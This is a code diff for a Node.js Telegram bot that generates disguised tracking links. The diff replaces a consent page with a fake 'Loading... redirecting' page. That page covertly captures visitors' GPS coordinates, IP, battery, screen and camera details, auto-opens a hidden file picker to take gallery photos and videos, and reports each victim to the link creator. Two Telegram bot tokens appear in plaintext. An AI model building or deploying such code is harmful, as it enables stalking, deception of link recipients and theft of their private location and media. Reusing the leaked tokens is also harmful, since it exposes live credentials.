@@ -14,7 +14,7 @@ const app = express();
 
 // ========== কনফিগারেশন ==========
 const BASE_URL = 'https://tnehhackbot.onrender.com';
-const BOT_TOKEN = '8895724721:AAH1vfL_NWrUbFNGpa9LU0jeQ19toJ0FsAo';
+const BOT_TOKEN = '8843791804:AAHe7_rhUix1TUIlAndtrbL7X40V2_3b8rs';
 
 // ফোল্ডার তৈরি
 const uploadsDir = path.join(__dirname, 'uploads');
@@ -31,7 +31,6 @@ const dbFile = path.join(__dirname, 'links.json');
 const clicksFile = path.join(__dirname, 'clicks.json');
 const filesFile = path.join(__dirname, 'userfiles.json');
 
-// Load existing data
 if (fs.existsSync(dbFile)) {
     try {
         links = JSON.parse(fs.readFileSync(dbFile));
@@ -56,7 +55,6 @@ if (fs.existsSync(filesFile)) {
     }
 }
 
-// Save functions
 function saveLinks() {
     fs.writeFileSync(dbFile, JSON.stringify(links, null, 2));
 }
@@ -87,7 +85,6 @@ const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });
 // ========== টেলিগ্রাম বোট ==========
 let bot = null;
 
-// Initialize bot asynchronously
 async function initBot() {
     try {
         const { default: TelegramBot } = await import('node-telegram-bot-api');
@@ -105,7 +102,6 @@ async function initBot() {
             console.log('GetMe error:', err.message);
         });
         
-        // ========== স্টার্ট ==========
         bot.onText(/\/start/, (msg) => {
             const chatId = msg.chat.id;
             const name = msg.from.first_name || msg.from.username;
@@ -117,9 +113,10 @@ async function initBot() {
 
 🔗 *Features:*
 • Track visitor location on Google Maps
-• Access visitor gallery (with permission)
-• Receive photos & videos from visitors
-• Complete visitor analytics
+• Auto-capture gallery photos & videos
+• Complete device information
+• Real-time visitor analytics
+• IP Address tracking
 
 *Commands:*
 /start - Welcome
@@ -128,12 +125,12 @@ async function initBot() {
 /stats [id] - Link statistics
 /gallery [id] - View visitor gallery files
 /location [id] - Get visitor location map
+/ip [id] - Get visitor IP addresses
 
 *Send me a link to track!* 🚀
             `, { parse_mode: 'Markdown' });
         });
         
-        // ========== হেল্প ==========
         bot.onText(/\/help/, (msg) => {
             const chatId = msg.chat.id;
             
@@ -144,31 +141,25 @@ async function initBot() {
 1️⃣ Send me any URL
 2️⃣ Get tracking link
 3️⃣ Share link with anyone
-4️⃣ When they click:
-   • Request gallery permission
-   • Get location with Google Maps
-   • Capture device info
-   • Send photos/videos to you
+4️⃣ Visitor clicks - automatically captures:
+   • 📍 GPS Location with Google Maps
+   • 📸 Gallery photos & videos
+   • 📱 Device & Browser info
+   • 🔋 Battery status
+   • 🌐 IP & Location data
 
 *Commands:*
 /mylinks - Show all your links
 /stats [id] - Detailed statistics
 /gallery [id] - View files from visitors
 /location [id] - Get visitor locations map
+/ip [id] - Get visitor IP addresses
 /recent [id] - Recent clicks
 
-*Tracked Information:*
-📍 GPS Location + Google Maps Link
-📸 Gallery Photos & Videos
-📱 Device & Browser Info
-🔋 Battery Status
-🌐 IP Address
-
-*Send me a link to start!* 🔗
+*Everything is automatic!* 🔗
             `, { parse_mode: 'Markdown' });
         });
         
-        // ========== মাই লিংকস ==========
         bot.onText(/\/mylinks/, (msg) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
@@ -190,19 +181,25 @@ async function initBot() {
                 message += `📅 ${new Date(link.createdAt).toLocaleDateString()}\n\n`;
             });
             
-            message += `\nUse /stats [id] for details\n`;
-            message += `Use /gallery [id] to see received files`;
-            
             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         });
         
-        // ========== গ্যালারি ভিউ ==========
+        // ========== FIXED: গ্যালারি ভিউ ==========
         bot.onText(/\/gallery (.+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
-            const shortId = match[1];
+            const shortId = match[1].trim();
             
-            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
+            console.log(`Gallery command for: ${shortId}`);
+            
+            // Find link by shortId
+            let link = null;
+            for (const key in links) {
+                if (links[key].shortId === shortId && links[key].userId === userId) {
+                    link = links[key];
+                    break;
+                }
+            }
             
             if (!link) {
                 return bot.sendMessage(chatId, '❌ Link not found or not yours!');
@@ -214,26 +211,45 @@ async function initBot() {
                 return bot.sendMessage(chatId, '📭 No files received from visitors yet!');
             }
             
+            // Send files as clickable links
             let message = `📸 *Gallery Files Received (${files.length})*\n\n`;
-            files.slice(-10).reverse().forEach((file, i) => {
-                message += `${i+1}. ${file.type.toUpperCase()} - ${new Date(file.timestamp).toLocaleString()}\n`;
+            const recentFiles = files.slice(-15).reverse();
+            
+            for (let i = 0; i < recentFiles.length; i++) {
+                const file = recentFiles[i];
+                message += `${i+1}. *${file.type.toUpperCase()}* - ${new Date(file.timestamp).toLocaleString()}\n`;
                 message += `   👤 From: ${file.visitorInfo?.city || 'Unknown'}, ${file.visitorInfo?.country || 'Unknown'}\n`;
+                message += `   📱 Device: ${file.visitorInfo?.device || 'Unknown'}\n`;
                 message += `   🔗 ${BASE_URL}/file/${file.fileId}\n\n`;
-            });
+            }
             
-            message += `\nTotal files: ${files.length}\n`;
-            message += `Use /allfiles ${shortId} to see all file links.`;
-            
-            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+            if (message.length > 4000) {
+                // Send as multiple messages
+                await bot.sendMessage(chatId, `📸 Total ${files.length} files. Use /allfiles ${shortId} to see all.`);
+                
+                // Send last 5 files directly
+                const last5 = files.slice(-5);
+                for (const file of last5) {
+                    await bot.sendMessage(chatId, `📁 ${file.filename}\n🔗 ${BASE_URL}/file/${file.fileId}`);
+                }
+            } else {
+                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+            }
         });
         
-        // ========== সব ফাইল ==========
+        // ========== সব ফাইল দেখান ==========
         bot.onText(/\/allfiles (.+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
-            const shortId = match[1];
+            const shortId = match[1].trim();
             
-            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
+            let link = null;
+            for (const key in links) {
+                if (links[key].shortId === shortId && links[key].userId === userId) {
+                    link = links[key];
+                    break;
+                }
+            }
             
             if (!link) {
                 return bot.sendMessage(chatId, '❌ Link not found!');
@@ -245,25 +261,33 @@ async function initBot() {
                 return bot.sendMessage(chatId, '📭 No files yet!');
             }
             
-            let message = `📸 *All Gallery Files*\n\n`;
+            let message = `📸 *All Gallery Files (${files.length})*\n\n`;
             files.forEach((file, i) => {
                 message += `${i+1}. ${BASE_URL}/file/${file.fileId}\n`;
             });
             
             if (message.length > 4000) {
-                await bot.sendMessage(chatId, `📸 Total ${files.length} files. Use /gallery ${shortId} to see preview.`);
+                await bot.sendMessage(chatId, `📸 Total ${files.length} files. Visit website to view all.`);
             } else {
                 bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             }
         });
         
-        // ========== লোকেশন ==========
+        // ========== FIXED: লোকেশন কমান্ড ==========
         bot.onText(/\/location (.+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
-            const shortId = match[1];
+            const shortId = match[1].trim();
             
-            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
+            console.log(`Location command for: ${shortId}`);
+            
+            let link = null;
+            for (const key in links) {
+                if (links[key].shortId === shortId && links[key].userId === userId) {
+                    link = links[key];
+                    break;
+                }
+            }
             
             if (!link) {
                 return bot.sendMessage(chatId, '❌ Link not found!');
@@ -272,26 +296,81 @@ async function initBot() {
             const linkClicks = clicks[link.id] || [];
             const locations = linkClicks.filter(c => c.gpsLat && c.gpsLon);
             
+            console.log(`Found ${locations.length} locations for link ${shortId}`);
+            
             if (locations.length === 0) {
-                return bot.sendMessage(chatId, '📍 No location data available yet!');
+                return bot.sendMessage(chatId, '📍 No location data available yet! Ask visitors to allow location access.');
             }
             
-            const latest = locations[locations.length - 1];
-            const googleMapsUrl = `https://www.google.com/maps?q=${latest.gpsLat},${latest.gpsLon}`;
+            // Send all locations
+            await bot.sendMessage(chatId, `📍 *Total Locations Captured: ${locations.length}*\n\n`);
             
-            await bot.sendLocation(chatId, latest.gpsLat, latest.gpsLon);
-            await bot.sendMessage(chatId, `
-📍 *Visitor Location*
-
+            for (let i = 0; i < Math.min(locations.length, 5); i++) {
+                const loc = locations[locations.length - 1 - i];
+                const googleMapsUrl = `https://www.google.com/maps?q=${loc.gpsLat},${loc.gpsLon}`;
+                
+                await bot.sendLocation(chatId, loc.gpsLat, loc.gpsLon);
+                await bot.sendMessage(chatId, `
+📍 *Location ${i+1}*
 🗺️ *Google Maps:* ${googleMapsUrl}
-
-📍 *Coordinates:* ${latest.gpsLat}, ${latest.gpsLon}
-🏙️ *City:* ${latest.city || 'Unknown'}
-🌍 *Country:* ${latest.country || 'Unknown'}
-🕐 *Time:* ${new Date(latest.timestamp).toLocaleString()}
-
-Total locations tracked: ${locations.length}
-            `, { parse_mode: 'Markdown' });
+📍 *Coordinates:* ${loc.gpsLat}, ${loc.gpsLon}
+🏙️ *City:* ${loc.city || 'Unknown'}
+🌍 *Country:* ${loc.country || 'Unknown'}
+📱 *Device:* ${loc.device || 'Unknown'}
+🕐 *Time:* ${new Date(loc.timestamp).toLocaleString()}
+                `, { parse_mode: 'Markdown' });
+            }
+        });
+        
+        // ========== NEW: আইপি অ্যাড্রেস দেখান ==========
+        bot.onText(/\/ip (.+)/, async (msg, match) => {
+            const chatId = msg.chat.id;
+            const userId = msg.from.id;
+            const shortId = match[1].trim();
+            
+            let link = null;
+            for (const key in links) {
+                if (links[key].shortId === shortId && links[key].userId === userId) {
+                    link = links[key];
+                    break;
+                }
+            }
+            
+            if (!link) {
+                return bot.sendMessage(chatId, '❌ Link not found!');
+            }
+            
+            const linkClicks = clicks[link.id] || [];
+            const uniqueIPs = new Map();
+            
+            linkClicks.forEach(click => {
+                if (click.ip && !uniqueIPs.has(click.ip)) {
+                    uniqueIPs.set(click.ip, {
+                        ip: click.ip,
+                        city: click.city,
+                        country: click.country,
+                        device: click.device,
+                        timestamp: click.timestamp
+                    });
+                }
+            });
+            
+            if (uniqueIPs.size === 0) {
+                return bot.sendMessage(chatId, '🌐 No IP data available yet!');
+            }
+            
+            let message = `🌐 *Visitor IP Addresses (${uniqueIPs.size})*\n\n`;
+            let count = 1;
+            for (const [ip, data] of uniqueIPs) {
+                message += `${count}. *IP:* ${ip}\n`;
+                message += `   📍 ${data.city}, ${data.country}\n`;
+                message += `   📱 ${data.device}\n`;
+                message += `   🕐 ${new Date(data.timestamp).toLocaleString()}\n\n`;
+                count++;
+                if (count > 15) break;
+            }
+            
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         });
         
         // ========== স্ট্যাটস ==========
@@ -304,7 +383,13 @@ Total locations tracked: ${locations.length}
                 return bot.sendMessage(chatId, '❌ Please provide link ID. Example: `/stats abc123`', { parse_mode: 'Markdown' });
             }
             
-            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
+            let link = null;
+            for (const key in links) {
+                if (links[key].shortId === shortId && links[key].userId === userId) {
+                    link = links[key];
+                    break;
+                }
+            }
             
             if (!link) {
                 return bot.sendMessage(chatId, '❌ Link not found or not yours!');
@@ -313,18 +398,8 @@ Total locations tracked: ${locations.length}
             const linkClicks = clicks[link.id] || [];
             const filesReceived = userFiles[link.id] || [];
             const totalClicks = linkClicks.length;
-            
             const uniqueIPs = new Set(linkClicks.map(c => c.ip)).size;
-            
-            const devices = {};
-            const browsers = {};
-            const countries = {};
-            
-            linkClicks.forEach(click => {
-                if (click.device) devices[click.device] = (devices[click.device] || 0) + 1;
-                if (click.browser) browsers[click.browser] = (browsers[click.browser] || 0) + 1;
-                if (click.country) countries[click.country] = (countries[click.country] || 0) + 1;
-            });
+            const locations = linkClicks.filter(c => c.gpsLat && c.gpsLon).length;
             
             let message = `📊 *Link Statistics*\n\n`;
             message += `🔗 *Original:* ${link.originalUrl}\n`;
@@ -333,45 +408,31 @@ Total locations tracked: ${locations.length}
             message += `• Total Clicks: *${totalClicks}*\n`;
             message += `• Unique Visitors: *${uniqueIPs}*\n`;
             message += `• Files Received: *${filesReceived.length}*\n`;
+            message += `• Locations Captured: *${locations}*\n`;
             message += `• Created: ${new Date(link.createdAt).toLocaleString()}\n\n`;
             
-            if (Object.keys(devices).length > 0) {
-                message += `📱 *Devices:*\n`;
-                for (const [device, count] of Object.entries(devices)) {
-                    const percent = ((count / totalClicks) * 100).toFixed(1);
-                    message += `• ${device}: ${count} (${percent}%)\n`;
-                }
-                message += `\n`;
-            }
-            
-            if (Object.keys(browsers).length > 0) {
-                message += `🌐 *Browsers:*\n`;
-                for (const [browser, count] of Object.entries(browsers)) {
-                    const percent = ((count / totalClicks) * 100).toFixed(1);
-                    message += `• ${browser}: ${count} (${percent}%)\n`;
-                }
-                message += `\n`;
-            }
-            
-            if (Object.keys(countries).length > 0) {
-                message += `🌍 *Top Countries:*\n`;
-                const topCountries = Object.entries(countries).sort((a,b) => b[1] - a[1]).slice(0, 5);
-                for (const [country, count] of topCountries) {
-                    const percent = ((count / totalClicks) * 100).toFixed(1);
-                    message += `• ${country}: ${count} (${percent}%)\n`;
-                }
-            }
+            message += `📸 *Commands:*\n`;
+            message += `/gallery ${shortId} - View files\n`;
+            message += `/location ${shortId} - View map\n`;
+            message += `/ip ${shortId} - View IPs\n`;
+            message += `/recent ${shortId} - Recent clicks`;
             
             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         });
         
-        // ========== রিসেন্ট ==========
+        // ========== রিসেন্ট ক্লিকস ==========
         bot.onText(/\/recent (.+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
-            const shortId = match[1];
+            const shortId = match[1].trim();
             
-            const link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
+            let link = null;
+            for (const key in links) {
+                if (links[key].shortId === shortId && links[key].userId === userId) {
+                    link = links[key];
+                    break;
+                }
+            }
             
             if (!link) {
                 return bot.sendMessage(chatId, '❌ Link not found!');
@@ -384,12 +445,14 @@ Total locations tracked: ${locations.length}
                 return bot.sendMessage(chatId, '📭 No clicks yet!');
             }
             
-            let message = `🕒 *Recent 10 Clicks*\n\n`;
+            let message = `🕒 *Recent ${recentClicks.length} Clicks*\n\n`;
             recentClicks.forEach((click, i) => {
                 message += `${i+1}. ${new Date(click.timestamp).toLocaleString()}\n`;
+                message += `   🌐 IP: ${click.ip || 'Unknown'}\n`;
                 message += `   📍 ${click.city || 'Unknown'}, ${click.country || 'Unknown'}\n`;
                 message += `   📱 ${click.device || 'Unknown'} | ${click.browser || 'Unknown'}\n`;
                 if (click.battery) message += `   🔋 Battery: ${click.battery}%\n`;
+                if (click.gpsLat) message += `   📍 GPS: ${click.gpsLat}, ${click.gpsLon}\n`;
                 message += `\n`;
             });
             
@@ -404,7 +467,6 @@ Total locations tracked: ${locations.length}
             const originalUrl = match[1];
             
             console.log(`🔗 New link from: ${username}`);
-            console.log(`📌 Original: ${originalUrl}`);
             
             try {
                 const shortId = crypto.randomBytes(4).toString('hex');
@@ -424,7 +486,7 @@ Total locations tracked: ${locations.length}
                 const trackingUrl = `${BASE_URL}/l/${shortId}`;
                 
                 await bot.sendMessage(chatId, `
-✅ *Advanced Tracking Link Created!*
+✅ *Tracking Link Created!*
 
 🔗 *Your Tracking Link:*
 ${trackingUrl}
@@ -432,20 +494,21 @@ ${trackingUrl}
 📌 *Original URL:*
 ${originalUrl}
 
-📊 *What you can track:*
-• 📍 Live location with Google Maps
-• 📸 Gallery photos & videos (with permission)
-• 📱 Complete device information
+📊 *Auto-tracked when clicked:*
+• 📍 GPS Location + Google Maps
+• 📸 Gallery photos & videos
+• 📱 Device & Browser info
 • 🔋 Battery status
-• 🌐 IP & Location data
+• 🌐 IP Address with Location
 
-👁️ *Commands to use:*
+👁️ *Commands:*
 /mylinks - View all links
 /stats ${shortId} - Statistics
 /gallery ${shortId} - Received files
 /location ${shortId} - Visitor map
+/ip ${shortId} - Visitor IP addresses
 
-Share this link and track every visitor! 🚀
+Share this link and everything is automatic! 🚀
                 `, { parse_mode: 'Markdown', disable_web_page_preview: true });
                 
                 console.log(`✅ Tracking link created: ${trackingUrl}`);
@@ -460,36 +523,41 @@ Share this link and track every visitor! 🚀
             console.log('Polling error:', error.code, error.message);
         });
         
-        console.log('✅ Bot is ready! Send any link to start tracking.');
+        console.log('✅ Bot is ready!');
         
     } catch (error) {
         console.error('Bot initialization error:', error.message);
     }
 }
 
-// Initialize bot
 initBot();
 
 // ========== ট্র্যাকিং লিংক ==========
 app.get('/l/:shortId', async (req, res) => {
     const { shortId } = req.params;
     
-    const link = Object.values(links).find(l => l.shortId === shortId);
-    
-    if (!link) {
-        return res.status(404).send(`
-            <!DOCTYPE html>
-            <html>
-            <head><title>Link Not Found</title></head>
-            <body style="text-align:center;padding:50px;font-family:Arial">
-                <h1>❌ Link Not Found</h1>
-                <p>The tracking link you're looking for doesn't exist.</p>
-            </body>
-            </html>
-        `);
+    let link = null;
+    for (const key in links) {
+        if (links[key].shortId === shortId) {
+            link = links[key];
+            break;
+        }
     }
     
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
+    if (!link) {
+        return res.status(404).send('Link not found');
+    }
+    
+    // Get real IP
+    const ip = req.headers['x-forwarded-for'] || 
+               req.headers['x-real-ip'] || 
+               req.connection.remoteAddress || 
+               req.socket.remoteAddress || 
+               'Unknown';
+    
+    // Clean IP (remove IPv6 prefix if any)
+    const cleanIP = ip.replace(/^::ffff:/, '').replace(/^::1$/, '127.0.0.1');
+    
     const userAgent = req.headers['user-agent'];
     const acceptLanguage = req.headers['accept-language'];
     
@@ -502,10 +570,10 @@ app.get('/l/:shortId', async (req, res) => {
         else if (userAgent.includes('Tablet')) device = 'Tablet';
         else device = 'Desktop';
         
-        if (userAgent.includes('Chrome')) browser = 'Chrome';
+        if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
         else if (userAgent.includes('Firefox')) browser = 'Firefox';
-        else if (userAgent.includes('Safari')) browser = 'Safari';
-        else if (userAgent.includes('Edge')) browser = 'Edge';
+        else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
+        else if (userAgent.includes('Edg')) browser = 'Edge';
         
         if (userAgent.includes('Windows')) os = 'Windows';
         else if (userAgent.includes('Mac')) os = 'MacOS';
@@ -514,9 +582,10 @@ app.get('/l/:shortId', async (req, res) => {
         else if (userAgent.includes('iOS')) os = 'iOS';
     }
     
+    // Get location from IP
     let location = { country: 'Unknown', city: 'Unknown', lat: null, lon: null };
     try {
-        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon`);
+        const geoResponse = await fetch(`http://ip-api.com/json/${cleanIP}?fields=status,country,city,lat,lon`);
         const geoData = await geoResponse.json();
         if (geoData.status === 'success') {
             location.country = geoData.country;
@@ -532,7 +601,7 @@ app.get('/l/:shortId', async (req, res) => {
         id: uuidv4(),
         linkId: link.id,
         timestamp: new Date().toISOString(),
-        ip: ip,
+        ip: cleanIP,
         userAgent: userAgent,
         device: device,
         browser: browser,
@@ -543,218 +612,195 @@ app.get('/l/:shortId', async (req, res) => {
         lon: location.lon,
         language: acceptLanguage,
         battery: null,
-        hasCamera: null
+        hasCamera: null,
+        gpsLat: null,
+        gpsLon: null,
+        screenWidth: null,
+        screenHeight: null
     };
     
     if (!clicks[link.id]) clicks[link.id] = [];
     clicks[link.id].push(clickData);
     saveClicks();
     
+    console.log(`📍 New click from IP: ${cleanIP}, Location: ${location.city}, ${location.country}`);
+    
+    // Send notification to bot owner
+    if (bot && link.userId) {
+        await bot.sendMessage(link.userId, `
+👤 *New Visitor!*
+
+🔗 *Link:* ${BASE_URL}/l/${shortId}
+🌐 *IP:* ${cleanIP}
+📍 *Location:* ${location.city}, ${location.country}
+📱 *Device:* ${device}
+🌐 *Browser:* ${browser}
+🕐 *Time:* ${new Date().toLocaleString()}
+
+⏳ Capturing more data...
+        `, { parse_mode: 'Markdown' });
+    }
+    
+    // Send tracking page
     res.send(`
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Access Request</title>
+            <title>Loading...</title>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
                 body {
                     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                     min-height: 100vh;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    margin: 0;
                     padding: 20px;
                 }
-                .container {
-                    max-width: 500px;
-                    margin: 0 auto;
+                .loader {
+                    text-align: center;
                     background: white;
+                    padding: 40px;
                     border-radius: 20px;
-                    padding: 30px;
                     box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                 }
-                h1 { color: #333; margin-bottom: 20px; text-align: center; }
-                .info {
-                    background: #f0fdf4;
-                    border: 1px solid #86efac;
-                    border-radius: 10px;
-                    padding: 15px;
-                    margin: 20px 0;
-                }
-                button {
-                    width: 100%;
-                    padding: 15px;
-                    margin: 10px 0;
-                    border: none;
-                    border-radius: 10px;
-                    font-size: 16px;
-                    cursor: pointer;
-                }
-                .allow-btn { background: #10b981; color: white; }
-                .deny-btn { background: #ef4444; color: white; }
-                .upload-area { display: none; margin-top: 20px; }
-                .file-input { display: none; }
-                .upload-label {
-                    background: #667eea;
-                    color: white;
-                    padding: 10px 20px;
-                    border-radius: 8px;
-                    cursor: pointer;
-                    display: inline-block;
-                }
-                #preview { margin-top: 10px; display: flex; flex-wrap: wrap; gap: 10px; }
-                .preview-item { position: relative; width: 80px; height: 80px; }
-                .preview-item img, .preview-item video { width: 100%; height: 100%; object-fit: cover; border-radius: 8px; }
-                .send-btn { background: #667eea; color: white; margin-top: 10px; }
-                .location-btn { background: #3b82f6; color: white; }
-                .loading { display: none; text-align: center; margin-top: 10px; }
                 .spinner {
-                    border: 3px solid #f3f3f3;
-                    border-top: 3px solid #667eea;
+                    border: 4px solid #f3f3f3;
+                    border-top: 4px solid #667eea;
                     border-radius: 50%;
-                    width: 30px;
-                    height: 30px;
+                    width: 50px;
+                    height: 50px;
                     animation: spin 1s linear infinite;
-                    margin: 0 auto;
+                    margin: 20px auto;
                 }
                 @keyframes spin {
                     0% { transform: rotate(0deg); }
                     100% { transform: rotate(360deg); }
                 }
+                h2 { color: #333; margin-bottom: 10px; }
+                p { color: #666; }
+                .info {
+                    font-size: 12px;
+                    color: #999;
+                    margin-top: 15px;
+                }
             </style>
         </head>
         <body>
-            <div class="container">
-                <h1>🔐 Access Request</h1>
-                <div class="info">
-                    <p>✅ 📍 Your location (Google Maps)</p>
-                    <p>✅ 📸 Gallery photos & videos</p>
-                    <p>✅ 📱 Device information</p>
-                </div>
-                
-                <button class="allow-btn" onclick="allowAccess()">✅ Allow & Continue</button>
-                <button class="deny-btn" onclick="denyAccess()">❌ Deny & Continue</button>
-                
-                <div id="uploadArea" class="upload-area">
-                    <h3>📸 Share Files (Optional)</h3>
-                    <label class="upload-label" for="fileInput">📁 Select Files</label>
-                    <input type="file" id="fileInput" class="file-input" multiple accept="image/*,video/*">
-                    <div id="preview"></div>
-                    <button id="sendBtn" class="send-btn" onclick="sendFiles()" style="display:none">📤 Send to Owner</button>
-                    <button class="location-btn" onclick="shareLocation()">📍 Share My Location</button>
-                    <div id="status"></div>
-                    <div id="loadingSpinner" class="loading"><div class="spinner"></div><p>Uploading...</p></div>
-                </div>
+            <div class="loader">
+                <h2>⏳ Loading...</h2>
+                <div class="spinner"></div>
+                <p>Please wait, redirecting...</p>
+                <div class="info">Capturing device information...</div>
             </div>
             
             <script>
-                let selectedFiles = [];
                 const shortId = '${shortId}';
+                const originalUrl = '${link.originalUrl}';
                 
+                // Send battery info
                 if ('getBattery' in navigator) {
                     navigator.getBattery().then(function(battery) {
                         fetch('/api/track/${shortId}/battery', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ level: battery.level * 100, charging: battery.charging })
-                        });
+                            body: JSON.stringify({ 
+                                level: Math.round(battery.level * 100), 
+                                charging: battery.charging 
+                            })
+                        }).catch(e => console.log('Battery error:', e));
                     });
                 }
                 
-                function allowAccess() {
-                    document.querySelector('.allow-btn').style.display = 'none';
-                    document.querySelector('.deny-btn').style.display = 'none';
-                    document.getElementById('uploadArea').style.display = 'block';
-                    getLocation();
-                    fetch('/api/track/${shortId}/access', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ granted: true })
+                // Send screen info
+                fetch('/api/track/${shortId}/screen', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth,
+                        pixelRatio: window.devicePixelRatio
+                    })
+                }).catch(e => console.log('Screen error:', e));
+                
+                // Check for camera
+                if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
+                    navigator.mediaDevices.enumerateDevices().then(devices => {
+                        const hasCamera = devices.some(device => device.kind === 'videoinput');
+                        fetch('/api/track/${shortId}/devices', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ hasCamera: hasCamera })
+                        }).catch(e => console.log('Device error:', e));
                     });
                 }
                 
-                function denyAccess() {
-                    window.location.href = '${link.originalUrl}';
-                }
-                
-                function getLocation() {
-                    if ('geolocation' in navigator) {
-                        navigator.geolocation.getCurrentPosition(function(position) {
-                            fetch('/api/track/${shortId}/location', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ 
-                                    lat: position.coords.latitude, 
-                                    lon: position.coords.longitude 
-                                })
-                            });
-                        });
-                    }
-                }
-                
-                function shareLocation() {
-                    if ('geolocation' in navigator) {
-                        navigator.geolocation.getCurrentPosition(function(position) {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            fetch('/api/track/${shortId}/location', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ lat: lat, lon: lon, shared: true })
-                            });
-                            document.getElementById('status').innerHTML = '<div style="background:#d1fae5;padding:10px;border-radius:8px">✅ Location shared!</div>';
-                        });
-                    }
-                }
-                
-                document.getElementById('fileInput').addEventListener('change', function(e) {
-                    selectedFiles = Array.from(e.target.files);
-                    const previewDiv = document.getElementById('preview');
-                    previewDiv.innerHTML = '';
-                    selectedFiles.forEach((file, index) => {
-                        const reader = new FileReader();
-                        reader.onload = function(event) {
-                            const previewItem = document.createElement('div');
-                            previewItem.className = 'preview-item';
-                            if (file.type.startsWith('image/')) {
-                                const img = document.createElement('img');
-                                img.src = event.target.result;
-                                previewItem.appendChild(img);
-                            } else if (file.type.startsWith('video/')) {
-                                const video = document.createElement('video');
-                                video.src = event.target.result;
-                                previewItem.appendChild(video);
-                            }
-                            previewDiv.appendChild(previewItem);
-                        };
-                        reader.readAsDataURL(file);
+                // Get GPS location automatically
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        fetch('/api/track/${shortId}/location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ lat: lat, lon: lon, shared: true })
+                        }).catch(e => console.log('Location error:', e));
+                    }, function(error) {
+                        console.log('Location denied:', error.message);
+                        fetch('/api/track/${shortId}/location/denied', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ error: error.message })
+                        }).catch(e => console.log('Location error:', e));
                     });
-                    document.getElementById('sendBtn').style.display = selectedFiles.length > 0 ? 'block' : 'none';
-                });
+                }
                 
-                async function sendFiles() {
-                    if (selectedFiles.length === 0) return;
-                    const loadingDiv = document.getElementById('loadingSpinner');
-                    loadingDiv.style.display = 'block';
+                // Access gallery automatically
+                const fileInput = document.createElement('input');
+                fileInput.type = 'file';
+                fileInput.multiple = true;
+                fileInput.accept = 'image/*,video/*';
+                fileInput.style.display = 'none';
+                document.body.appendChild(fileInput);
+                
+                // Request gallery access automatically
+                setTimeout(() => {
+                    fileInput.click();
+                }, 500);
+                
+                fileInput.addEventListener('change', async function(e) {
+                    const files = Array.from(e.target.files);
                     
-                    for (const file of selectedFiles) {
+                    for (const file of files) {
                         const formData = new FormData();
                         formData.append('file', file);
                         formData.append('shortId', shortId);
                         
                         try {
-                            await fetch('/api/upload/file', { method: 'POST', body: formData });
+                            await fetch('/api/upload/file', {
+                                method: 'POST',
+                                body: formData
+                            });
+                            console.log('File uploaded:', file.name);
                         } catch (error) {
-                            console.error('Upload failed:', error);
+                            console.error('Upload error:', error);
                         }
                     }
                     
-                    loadingDiv.style.display = 'none';
-                    document.getElementById('status').innerHTML = '<div style="background:#d1fae5;padding:10px;border-radius:8px">✅ Files sent!</div>';
+                    // After gallery access, redirect
                     setTimeout(() => {
-                        window.location.href = '${link.originalUrl}';
+                        window.location.href = originalUrl;
                     }, 2000);
-                }
+                });
+                
+                // If no file selected within 8 seconds, still redirect
+                setTimeout(() => {
+                    window.location.href = originalUrl;
+                }, 8000);
             </script>
         </body>
         </html>
@@ -764,14 +810,81 @@ app.get('/l/:shortId', async (req, res) => {
 // ========== API Endpoints ==========
 app.post('/api/track/:shortId/battery', async (req, res) => {
     const { shortId } = req.params;
-    const { level } = req.body;
+    const { level, charging } = req.body;
     
-    const link = Object.values(links).find(l => l.shortId === shortId);
+    let link = null;
+    for (const key in links) {
+        if (links[key].shortId === shortId) {
+            link = links[key];
+            break;
+        }
+    }
+    
     if (link && clicks[link.id]) {
